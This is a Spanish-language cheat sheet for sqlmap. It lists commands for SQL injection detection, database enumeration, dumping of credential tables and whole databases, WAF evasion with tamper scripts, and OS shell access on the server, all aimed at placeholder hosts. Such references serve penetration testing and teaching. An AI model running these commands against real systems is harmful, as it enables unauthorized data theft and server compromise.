# Sqlmap Cheat Sheet
> **Guía rápida de comandos para Sqlmap, la herramienta estándar de código abierto para automatizar la detección y explotación de fallos de inyección SQL (SQLi).**

---

## 🚀 Escaneo y Detección Básica

* **Escaneo básico de una petición GET**:
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --batch
  ```
  *(La opción `--batch` responde automáticamente con las respuestas por defecto del asistente)*.
* **Escaneo de peticiones complejas (interceptadas con Burp Suite)**:
  Guarda la petición web cruda de Burp Suite en un archivo (ej: `request.req`).
  ```bash
  sqlmap -r request.req --batch
  ```

---

## 📈 Parámetros de Optimización y Rendimiento

Aumentar el alcance de las pruebas y la velocidad de extracción.

* **Modificar el nivel y el riesgo de las pruebas (Por defecto Level 1, Risk 1)**:
  * `--level=5`: Amplía las pruebas buscando vulnerabilidades en cabeceras HTTP (User-Agent, Referer, Cookies).
  * `--risk=3`: Añade pruebas basadas en consultas pesadas (OR) que podrían impactar en el rendimiento de la base de datos.
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --level=5 --risk=3
  ```
* **Multiprocesamiento (Aumentar velocidad de extracción)**:
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --threads=10
  ```
* **Especificar el Sistema Gestor de Base de Datos (DBMS) para evitar escaneos inútiles**:
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --dbms=mysql
  ```

---

## 🗄️ Enumeración y Extracción de Información

Una vez confirmada la inyección SQL, extrae la información paso a paso.

1. **Obtener el nombre de las bases de datos disponibles**:
   ```bash
   sqlmap -r request.req --dbs
   ```
2. **Listar tablas de una base de datos específica (`-D`)**:
   ```bash
   sqlmap -r request.req -D db_name --tables
   ```
3. **Listar columnas de una tabla específica (`-T`)**:
   ```bash
   sqlmap -r request.req -D db_name -T users --columns
   ```
4. **Volcar los datos de la tabla (Dump)**:
   ```bash
   sqlmap -r request.req -D db_name -T users -C username,password --dump
   ```
5. **Volcar toda la base de datos completa**:
   ```bash
   sqlmap -r request.req -D db_name --dump-all
   ```

---

## 🛡️ Evasión de WAFs e IDS (Tamper Scripts)

Los WAFs bloquean palabras clave como `UNION` o `SELECT`. Los scripts de *tamper* modifican el payload para eludir firmas.

* **Listar tampers disponibles**:
  ```bash
  sqlmap --list-tampers
  ```
* **Uso de scripts tamper populares**:
  * `space2comment`: Reemplaza espacios por comentarios (`/**/`).
  * `charencode`: Codifica caracteres en formato URL.
  * `randomcase`: Alterna mayúsculas y minúsculas (ej: `SeLeCt`).
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --tamper=space2comment,randomcase
  ```

---

## 🐚 Obtención de Ejecución de Comandos (RCE)

Si la cuenta de la base de datos tiene privilegios de escritura/lectura y la base de datos soporta ejecución remota.

* **Ejecutar una shell interactiva en el servidor web**:
  ```bash
  sqlmap -r request.req --os-shell
  ```
* **Ejecutar comandos individuales del sistema operativo**:
  ```bash
  sqlmap -r request.req --os-cmd="whoami"
  ```
